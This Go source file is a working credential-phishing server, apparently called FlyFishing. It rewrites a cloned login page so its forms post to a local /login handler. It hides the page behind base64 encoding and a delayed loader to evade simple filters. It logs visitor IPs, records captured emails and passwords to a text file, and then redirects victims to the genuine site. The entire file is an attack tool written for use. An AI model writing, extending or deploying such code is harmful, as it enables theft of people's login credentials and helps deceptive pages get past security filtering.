package main

import (
	"encoding/base64"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
)

var (
	redirectURL = ""
)

func main() {
	customTemplate := flag.String("template", "", "specify a custom template to host [template.html]")
	help := flag.Bool("h", false, "show usage")
	flag.Parse()
	if *help {
		flag.Usage()
		return
	}
	if *customTemplate == "" {
		log.Fatal("[-] Error: Invalid usage of FlyFishing")
		flag.Usage()
		return
	}

	URL := strings.Split(*customTemplate, ".")[0]
	redirectURL = strings.Split(URL, "/")[1]
	redirectURL = fmt.Sprintf("https://%s.com", redirectURL) // redirect url after login form submission

	modifiedBody, err := modifyTemplate(*customTemplate)
	if err != nil {
		log.Fatalf("[-] Error: Failed to read or modify the template\n -> %v\n", err)
	}

	err = os.WriteFile("index.html", []byte(modifiedBody), 0644) // write current template to index.html for serving
	if err != nil {
		log.Fatalf("[-] Error: Failed to save the modified template\n -> %v\n", err)
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		ip := r.RemoteAddr
		log.Printf("[*] Client IP visiting the page: %s", ip) // output client ip on page visit
		http.ServeFile(w, r, "index.html")
	})
	http.HandleFunc("/login", handleLogin()) // default path

	log.Println("[*] Server started at http://localhost:8888") // servers login form from localhost by default
	log.Fatal(http.ListenAndServe(":8888", nil)) // server on localhost:8888 by default
}

// modify a given template and replace login form mechanism(s) as needed and encode the template
func modifyTemplate(templatePath string) (string, error) {
	body, err := os.ReadFile(templatePath)
	if err != nil {
		return "", err
	}

	html := string(body)
	// ugly ass regex to do the job
	re := regexp.MustCompile(`(?i)(<form[^>]*action=")([^"]*)(")`)
	modified := re.ReplaceAllString(html, `${1}/login${3}`)
	modified = strings.Replace(modified, `method="get"`, `method="post"`, 1)

	// encode in base64 for lil extra delay for simple filters
	encodedHTML := base64.StdEncoding.EncodeToString([]byte(modified))
	encodedHTML = fmt.Sprintf(`
		<!DOCTYPE html>
		<html>
		<head>
			<title>Loading...</title>
			<script>
				setTimeout(function() {
					var encodedHTML = "%s";
					document.body.innerHTML = atob(encodedHTML);
				}, 3000); // 3 seconds delay
			</script>
		</head>
		<body>
			<p>Loading content, please wait...</p>
		</body>
		</html>
	`, encodedHTML)

	return encodedHTML, nil
}

func handleLogin() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		ip := r.RemoteAddr
		log.Printf("[*] Client IP on login: %s", ip) // output when client visit page

		err := r.ParseForm()
		if err != nil {
			http.Error(w, "Failed to parse form", http.StatusBadRequest)
			return
		}

		// look for these valeus.. but im doing something wrong with the matching... (won't work on it tho cuz idgaf)
		emailSlice := []string{"email", "username", "user", "userid", "login_email", "login_user", "login_username", "phone_number", "phonenumber", "user_login"}
		passwdSlice := []string{"password", "pass", "PASS", "PWD", "login_pass", "login_password", "encpasswd", "encpass", "user_pass"}

		log.Println("[*] Received form data:")
		var email, password string
		for key, values := range r.Form {
			for _, value := range values {
				if extractCredentials(key, emailSlice) {
					email = value
				}
				if extractCredentials(key, passwdSlice) {
					password = value
				}
				log.Printf("Field: %s, Value: %s", key, value)
			}
		}

		f, err := os.OpenFile("login_results.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err != nil {
			log.Fatalf("[-] Error: Failed to write login data to file\n -> %v\n", err)
			return
		}
		defer f.Close()

		_, err = f.WriteString(fmt.Sprintf("[*] IP: %s, Email: %s, Password: %s\n", ip, email, password))
		if err != nil {
			log.Fatalf("[-] Error: Failed to write login data to file\n -> %v\n", err)
			return
		}

		http.Redirect(w, r, redirectURL, http.StatusSeeOther) // redirect to https://<file-name>.com
	}
}

// doesnt do well so pretty much dead code cuz im doin something wrong with the comparison
func extractCredentials(formKey string, fields []string) bool {
	for _, field := range fields {
		if strings.EqualFold(formKey, field) {
			return true
		}
	}
	return false
}
